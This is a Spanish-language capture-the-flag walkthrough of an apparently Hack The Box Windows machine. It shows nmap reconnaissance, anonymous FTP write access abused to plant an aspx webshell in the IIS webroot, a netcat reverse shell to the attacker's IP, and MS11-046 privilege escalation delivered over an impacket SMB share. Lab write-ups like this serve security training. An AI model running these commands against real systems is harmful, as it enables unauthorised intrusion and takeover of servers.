
---
- Tags: #windows #Easy #HTB #FTP #CVE 
- -- 

#### QUÉ SE EXPLOTA?

Abusing FTP + IIS Services
Microsoft Windows (x86) – ‘afd.sys’ (MS11-046) [Privilege Escalation]

#### Write Up

##### PRIMERA FASE: Reconocimento

**Vamos a empezar** como siempre con los primeros escaneos de rutina empezando por establecer una conexión **icmp** con **ping** 

![](../imgs/Pasted image 20251111150706.png)

Vemos que estamos ante una maquina **windows** por lo que proseguimos a hacer los 2 escaneos fundamentales. 

**El primer escaneo lo ocupamos para descubrir todos los puertos disponibles en un equipo**. Para el primer escaneo vamos a ocupar un **SYN scan** 

**El segundo escaneo lo ocupamos para recopilar mayor información sobre los puertos previamente encontrados**. 

![](../imgs/Pasted image 20251111150747.png)

Dentro de los puertos encontrados, encontramos el puerto **21** que corresponde a [[FTP]], y además encontramos el puerto **80** que corresponde a una página web. **Además nmap nos arrojó que el usuario anonymous está permitido**. 

Nos conectamos a **FTP** con anoymous y encontramos una **.png**. **Para descargar imagenes en ftp hay que recordar ponernos en modo *Binario*** 

```bash
binary
```

![](../imgs/Pasted image 20251111150904.png)

```bash
get welcome.png
```
![](../imgs/Pasted image 20251111151002.png)
Conseguimos la imagen y la abrimos con la misma **kitty**
```bash

kitty +kitten icat welcome.png
```

![](../imgs/Pasted image 20251111151107.png)

**Además de la imagén; En el escaneo secundario encontramos también información sobre [[IIS]]**. 

Ahora ya teniendo eso, proseguimos a inspeccionar la web que hay en el **puerto 80**. 

![](../imgs/Pasted image 20251111151656.png)

Es la misma imagen que había en **[[FTP]]**. **Posiblemente los recursos de la web también se comparten por [[FTP]]** por lo que proseguimos a ver si los archivos en **FTP** también están disponibles en la web. 

**De entrada no nos arroja error**

![](../imgs/Pasted image 20251111152005.png)

![](../imgs/Pasted image 20251111152021.png)
*Si cambiamos por .html arroja error*

##### SEGUNDA FASE: Explotación

Una vez que determinamos **que posiblemente está sincronizado [[FTP]] con el servidor [[IIS]]** podemos ver si tenemos permisos de subir archivos mediante **FTP**. 

**Creamos un .txt** y lo subimos por ftp

```bash
put test.txt
```

![](../imgs/Pasted image 20251111152627.png)

![](../imgs/Pasted image 20251111152710.png)

**Tenemos capacidad de escritura** por lo que proseguimos a mandar un archivo **[[aspx]]**.

**Podemos encontrar muchos en nuestro equipo que nos pueden servir**... 

```bash
locate .aspx
```
![](../imgs/Pasted image 20251111154118.png)

Usamos el primero **/davtest/backdoors/aspx_cmd.aspx**, lo copiamos a nuestra carpeta de trabajo
**Lo subimos a FTP** Y vemos la respuesta a nivel web

```bash

put aspx_cmd.aspx
```

![](../imgs/Pasted image 20251111154323.png)

**Podemos ejecutar comandos** a través de una **webshell**.
Como ya sabemos que a través de **[[FTP]]** podemos subir archivos, subimos [[NETCAT]]. 

**Este binario lo vamos a sacar de las SecLists**

```bash
locate nc.exe
```

lo copiamos en nuestro directorio y lo subimos por **[[FTP]]**

![](../imgs/Pasted image 20251112082613.png)

**Del lado del servidor [[IIS]] tenemos que acceder a la ruta donde posiblemente nc.exe se almacenó**, recordemos que en sistemas **IIS** la ruta en la que generalmente se almacenan las aplicaciones y recursos es:

**c:\inetpub\wwwroot\

![](../imgs/Pasted image 20251112083102.png)
**ya que localizamos el nc.exe, ahora lo ejecutamos y nos entablamos una [[Reverse shell.]]** 

```cmd
c:\inetpub\wwwroot\nc.exe -e cmd 10.10.16.6 4444
```

![](../imgs/Pasted image 20251112084509.png)

##### TERCERA FASE: Post explotación - Privesc

**Ya teniendo conexión a la maquina** proseguimos a escalar privilegios. Utilizando los **[[Comandos utiles para escalar]]** revisamos los de windows.

**La versión usada es una versión antigua**
![](../imgs/Pasted image 20251112085224.png)

**Buscamos algún exploit** por la versión encontrada 

![](../imgs/Pasted image 20251112085323.png)

Basandonos en **[[MS11-046]]** buscamos algún exploit en github. 
Lo descargamos y lo compartimos a través de **SMB**
```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username eyn -password eyn123
```

**Del lado windows**

```cmd
net use \\10.10.16.6\smbFolder /u:eyn eyn123
```

**copiamos el .exe en el directorio temp**

```cmd
cd c:\Windows\temp
```

```cmd
copy \\10.10.16.6\smbFolder\ms11-046.exe .
```

 lo ejecutamos y listo. 

![](../imgs/Pasted image 20251112091436.png)
